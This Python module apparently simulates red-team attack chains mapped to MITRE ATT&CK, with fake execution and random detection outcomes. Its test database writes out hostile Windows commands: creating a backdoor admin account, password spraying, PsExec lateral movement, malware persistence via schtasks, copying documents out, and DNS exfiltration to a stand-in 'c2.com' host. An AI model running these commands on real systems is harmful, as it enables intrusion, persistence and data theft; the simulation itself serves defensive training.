"""
Auto Red-Team Simulation & Atomic Attack Generator
Simulates adversarial attack chains using MITRE ATT&CK framework
"""

import json
import random
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from enum import Enum
from datetime import datetime, timedelta
import logging

logger = logging.getLogger(__name__)


class AttackStage(Enum):
    RECONNAISSANCE = "reconnaissance"
    INITIAL_ACCESS = "initial_access"
    EXECUTION = "execution"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DEFENSE_EVASION = "defense_evasion"
    CREDENTIAL_ACCESS = "credential_access"
    DISCOVERY = "discovery"
    LATERAL_MOVEMENT = "lateral_movement"
    COLLECTION = "collection"
    COMMAND_CONTROL = "command_and_control"
    EXFILTRATION = "exfiltration"
    IMPACT = "impact"


class SeverityLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class AtomicTest:
    """Represents a single MITRE Atomic Red Team test"""
    test_id: str
    technique_id: str
    technique_name: str
    tactic: str
    name: str
    description: str
    platform: str
    executor: str
    command: str
    cleanup: Optional[str] = None
    dependencies: List[str] = field(default_factory=list)
    severity: SeverityLevel = SeverityLevel.MEDIUM
    ttp_link: Optional[str] = None


@dataclass
class AttackChain:
    """Represents a sequence of related attacks (kill chain)"""
    chain_id: str
    name: str
    description: str
    adversary_name: str
    ttps: List[AtomicTest] = field(default_factory=list)
    timestamps: List[datetime] = field(default_factory=list)
    duration_seconds: int = 0
    success_rate: float = 1.0
    detection_difficulty: str = "hard"
    
    def get_stages(self) -> Dict[str, List[AtomicTest]]:
        """Group TTPs by stage"""
        stages = {}
        for ttp in self.ttps:
            if ttp.tactic not in stages:
                stages[ttp.tactic] = []
            stages[ttp.tactic].append(ttp)
        return stages


@dataclass
class LateralMovementPath:
    """Represents lateral movement through network"""
    source_host: str
    target_host: str
    hops: List[str] = field(default_factory=list)
    methods: List[str] = field(default_factory=list)
    credentials: List[str] = field(default_factory=list)
    detected_at_hop: int = -1  # -1 = undetected
    duration_seconds: int = 300


@dataclass
class BreachSimulation:
    """Complete breach simulation scenario"""
    sim_id: str
    timestamp: datetime
    initial_access_method: str
    attack_chains: List[AttackChain] = field(default_factory=list)
    lateral_movements: List[LateralMovementPath] = field(default_factory=list)
    exfiltrated_data: List[str] = field(default_factory=list)
    detected_at_stage: Optional[AttackStage] = None
    total_duration_seconds: int = 0


# ATOMIC RED TEAM TEST DATABASE
ATOMIC_TESTS_DB = {
    "T1087": AtomicTest(
        test_id="T1087-001",
        technique_id="T1087",
        technique_name="Account Discovery",
        tactic="discovery",
        name="Enumerate user accounts",
        description="Discovery of local user accounts",
        platform="windows",
        executor="cmd",
        command="net user",
        severity=SeverityLevel.LOW
    ),
    "T1078": AtomicTest(
        test_id="T1078-001",
        technique_id="T1078",
        technique_name="Valid Accounts",
        tactic="initial_access",
        name="Create local user account",
        description="Create new local user with admin rights",
        platform="windows",
        executor="cmd",
        command="net user attacker P@ssw0rd /add && net localgroup administrators attacker /add",
        severity=SeverityLevel.CRITICAL
    ),
    "T1110": AtomicTest(
        test_id="T1110-001",
        technique_id="T1110",
        technique_name="Brute Force",
        tactic="credential_access",
        name="Password spray",
        description="Spray common passwords across accounts",
        platform="windows",
        executor="cmd",
        command="@FOR /L %n IN (1,1,10) DO @IF %%n == 1 net use \\\\${targethost}\\c$ /u:Administrator password123",
        severity=SeverityLevel.HIGH
    ),
    "T1021": AtomicTest(
        test_id="T1021-006",
        technique_id="T1021",
        technique_name="Remote Services",
        tactic="lateral_movement",
        name="PsExec lateral movement",
        description="Move laterally using PsExec",
        platform="windows",
        executor="cmd",
        command="PsExec.exe \\\\${target} -u ${user} -p ${password} cmd.exe",
        severity=SeverityLevel.HIGH
    ),
    "T1053": AtomicTest(
        test_id="T1053-005",
        technique_id="T1053",
        technique_name="Scheduled Task/Job",
        tactic="persistence",
        name="Create scheduled task",
        description="Persistence via scheduled task",
        platform="windows",
        executor="cmd",
        command="schtasks /create /tn EvilTask /tr C:\\malware.exe /sc minute /mo 30",
        severity=SeverityLevel.HIGH
    ),
    "T1555": AtomicTest(
        test_id="T1555-003",
        technique_id="T1555",
        technique_name="Credentials from Password Stores",
        tactic="credential_access",
        name="Browser credential extraction",
        description="Extract credentials from browser storage",
        platform="windows",
        executor="cmd",
        command="powershell -c Get-Credentials",
        severity=SeverityLevel.CRITICAL
    ),
    "T1005": AtomicTest(
        test_id="T1005-001",
        technique_id="T1005",
        technique_name="Data from Local System",
        tactic="collection",
        name="Collect sensitive files",
        description="Collect data from local system",
        platform="windows",
        executor="cmd",
        command="robocopy C:\\Users\\${user}\\Documents D:\\exfil /s /e",
        severity=SeverityLevel.HIGH
    ),
    "T1048": AtomicTest(
        test_id="T1048-003",
        technique_id="T1048",
        technique_name="Exfiltration Over Alternative Protocol",
        tactic="exfiltration",
        name="DNS exfiltration",
        description="Exfiltrate data via DNS queries",
        platform="windows",
        executor="cmd",
        command="powershell -c nslookup data.exfil.c2.com",
        severity=SeverityLevel.CRITICAL
    ),
}


class AtomicRedTeamConnector:
    """Interface to MITRE Atomic Red Team tests"""
    
    def __init__(self):
        self.available_tests = ATOMIC_TESTS_DB.copy()
        self.executed_tests: List[AtomicTest] = []
    
    def get_test_by_technique(self, technique_id: str) -> Optional[AtomicTest]:
        """Get test for specific MITRE technique"""
        return self.available_tests.get(technique_id)
    
    def get_tests_by_tactic(self, tactic: str) -> List[AtomicTest]:
        """Get all tests for a specific tactic"""
        return [t for t in self.available_tests.values() if t.tactic == tactic]
    
    def execute_test(self, test: AtomicTest) -> Dict:
        """Simulate test execution"""
        result = {
            'test_id': test.test_id,
            'technique_id': test.technique_id,
            'timestamp': datetime.now().isoformat(),
            'platform': test.platform,
            'executor': test.executor,
            'command': test.command,
            'exit_code': random.choice([0, 0, 0, 1]),  # Mostly success
            'output': f"Executed: {test.name}",
            'duration_ms': random.randint(50, 5000)
        }
        self.executed_tests.append(test)
        return result


class BreachSimulator:
    """Simulates realistic breach scenarios"""
    
    def __init__(self):
        self.atomic_connector = AtomicRedTeamConnector()
        self.simulations: Dict[str, BreachSimulation] = {}
    
    def generate_breach_scenario(
        self,
        scenario_name: str,
        adversary: str,
        complexity: str = "medium"
    ) -> BreachSimulation:
        """Generate realistic breach attack chain"""
        
        sim_id = f"BREACH_{datetime.now().timestamp()}"
        sim = BreachSimulation(
            sim_id=sim_id,
            timestamp=datetime.now(),
            initial_access_method="phishing"
        )
        
        # Build attack chain based on complexity
        if complexity == "simple":
            stages = [AttackStage.INITIAL_ACCESS, AttackStage.EXECUTION]
        elif complexity == "medium":
            stages = [
                AttackStage.INITIAL_ACCESS,
                AttackStage.EXECUTION,
                AttackStage.PERSISTENCE,
                AttackStage.PRIVILEGE_ESCALATION,
                AttackStage.DISCOVERY
            ]
        else:  # complex
            stages = list(AttackStage)
        
        # Create attack chains for each stage
        for idx, stage in enumerate(stages):
            chain_id = f"{sim_id}_CHAIN_{idx}"
            chain = AttackChain(
                chain_id=chain_id,
                name=f"{stage.value} Chain",
                description=f"Attack chain for {stage.value}",
                adversary_name=adversary
            )
            
            # Add 1-3 TTPs per stage
            num_ttps = random.randint(1, 3)
            for _ in range(num_ttps):
                test = random.choice(list(self.atomic_connector.available_tests.values()))
                chain.ttps.append(test)
            
            chain.duration_seconds = random.randint(60, 3600)
            sim.attack_chains.append(chain)
        
        sim.total_duration_seconds = sum(c.duration_seconds for c in sim.attack_chains)
        self.simulations[sim_id] = sim
        
        return sim
    
    def simulate_breach_execution(self, scenario: BreachSimulation) -> BreachSimulation:
        """Simulate actual execution of breach with timing"""
        
        current_time = scenario.timestamp
        
        for chain in scenario.attack_chains:
            for ttp in chain.ttps:
                # Execute atomic test
                result = self.atomic_connector.execute_test(ttp)
                chain.timestamps.append(current_time)
                
                # Simulate detection
                if random.random() < 0.3:  # 30% detection rate
                    if scenario.detected_at_stage is None:
                        scenario.detected_at_stage = AttackStage(ttp.tactic)
                
                # Update timing
                current_time += timedelta(seconds=random.randint(30, 300))
        
        return scenario


class LateralMovementGenerator:
    """Generates realistic lateral movement patterns"""
    
    def __init__(self):
        self.network_topology = self._build_network()
    
    def _build_network(self) -> Dict[str, List[str]]:
        """Build network graph"""
        return {
            'workstation-1': ['workstation-2', 'server-1', 'fileserver'],
            'workstation-2': ['workstation-1', 'workstation-3', 'server-1'],
            'workstation-3': ['workstation-2', 'server-2'],
            'server-1': ['workstation-1', 'workstation-2', 'server-2', 'dc'],
            'server-2': ['workstation-3', 'server-1', 'dc'],
            'fileserver': ['workstation-1', 'server-1', 'dc'],
            'dc': ['server-1', 'server-2'],
        }
    
    def generate_lateral_path(
        self,
        source: str,
        target: str,
        num_hops: Optional[int] = None
    ) -> LateralMovementPath:
        """Generate path from source to target"""
        
        # Simple BFS path finding
        path = self._find_path(source, target)
        
        if not path:
            path = [source, target]
        
        movement = LateralMovementPath(
            source_host=source,
            target_host=target,
            hops=path[1:-1],  # Exclude source and target
            methods=[
                random.choice(['psexec', 'wmi', 'ssh', 'rdp', 'kerberoasting'])
                for _ in path[1:]
            ],
            credentials=[
                f"cred_{i}" for i in range(len(path) - 1)
            ],
            duration_seconds=random.randint(60, 1800)
        )
        
        # Detection probability increases with hops
        detection_prob = min(0.8, 0.2 * len(path))
        if random.random() < detection_prob:
            movement.detected_at_hop = random.randint(1, len(path) - 1)
        
        return movement
    
    def _find_path(self, start: str, end: str) -> List[str]:
        """BFS to find path through network"""
        from collections import deque
        
        queue = deque([(start, [start])])
        visited = {start}
        
        while queue:
            node, path = queue.popleft()
            
            if node == end:
                return path
            
            for neighbor in self.network_topology.get(node, []):
                if neighbor not in visited:
                    visited.add(neighbor)
                    queue.append((neighbor, path + [neighbor]))
        
        return []
    
    def generate_complex_path(self, num_hops: int = 5) -> List[LateralMovementPath]:
        """Generate multi-hop attack path"""
        paths = []
        
        hosts = list(self.network_topology.keys())
        current_host = random.choice(hosts)
        
        for _ in range(num_hops):
            next_host = random.choice(hosts)
            path = self.generate_lateral_path(current_host, next_host)
            paths.append(path)
            current_host = next_host
        
        return paths


class AttackChainBuilder:
    """Constructs realistic attack chains with visualization"""
    
    def __init__(self):
        self.breach_simulator = BreachSimulator()
        self.lateral_movement = LateralMovementGenerator()
    
    def build_full_attack_chain(
        self,
        adversary: str = "APT28",
        complexity: str = "medium"
    ) -> BreachSimulation:
        """Build complete attack chain"""
        
        # Generate base scenario
        scenario = self.breach_simulator.generate_breach_scenario(
            f"Attack by {adversary}",
            adversary,
            complexity
        )
        
        # Add lateral movement
        if complexity in ["medium", "complex"]:
            scenario.lateral_movements = self.lateral_movement.generate_complex_path(
                num_hops=3 if complexity == "medium" else 6
            )
        
        # Add data exfiltration targets
        scenario.exfiltrated_data = [
            "financial_data.xlsx",
            "customer_database.mdb",
            "trade_secrets.docx",
            "source_code.zip"
        ]
        
        # Simulate execution
        scenario = self.breach_simulator.simulate_breach_execution(scenario)
        
        return scenario
    
    def visualize_chain(self, scenario: BreachSimulation) -> str:
        """Generate text visualization of attack chain"""
        
        lines = [
            f"\n{'='*80}",
            f"ATTACK CHAIN: {scenario.sim_id}",
            f"{'='*80}",
            f"\nAdversary Activity Timeline:",
            f"Initial Access: {scenario.initial_access_method}",
            f"Duration: {scenario.total_duration_seconds} seconds",
            f"Detection Status: {'DETECTED at ' + scenario.detected_at_stage.value if scenario.detected_at_stage else 'UNDETECTED'}",
            f"\nAttack Stages:"
        ]
        
        for chain in scenario.attack_chains:
            lines.append(f"\n  [{chain.adversary_name}] {chain.name}")
            lines.append(f"  TTPs: {len(chain.ttps)}")
            for ttp in chain.ttps:
                lines.append(f"    • {ttp.technique_id}: {ttp.name}")
        
        if scenario.lateral_movements:
            lines.append(f"\nLateral Movement Paths:")
            for path in scenario.lateral_movements:
                detected_str = f" [DETECTED at hop {path.detected_at_hop}]" if path.detected_at_hop >= 0 else ""
                lines.append(
                    f"  {path.source_host} → {' → '.join(path.hops)} → {path.target_host}{detected_str}"
                )
        
        if scenario.exfiltrated_data:
            lines.append(f"\nExfiltrated Data:")
            for data in scenario.exfiltrated_data:
                lines.append(f"  • {data}")
        
        lines.append(f"\n{'='*80}\n")
        return "\n".join(lines)


# Global instances
_attack_chain_builder: Optional[AttackChainBuilder] = None


def get_attack_chain_builder() -> AttackChainBuilder:
    """Get or create global attack chain builder"""
    global _attack_chain_builder
    if _attack_chain_builder is None:
        _attack_chain_builder = AttackChainBuilder()
    return _attack_chain_builder


# Example usage and testing
if __name__ == "__main__":
    builder = get_attack_chain_builder()
    
    # Generate realistic attack scenarios
    simple_attack = builder.build_full_attack_chain("APT29", "simple")
    print(builder.visualize_chain(simple_attack))
    
    complex_attack = builder.build_full_attack_chain("APT28", "complex")
    print(builder.visualize_chain(complex_attack))
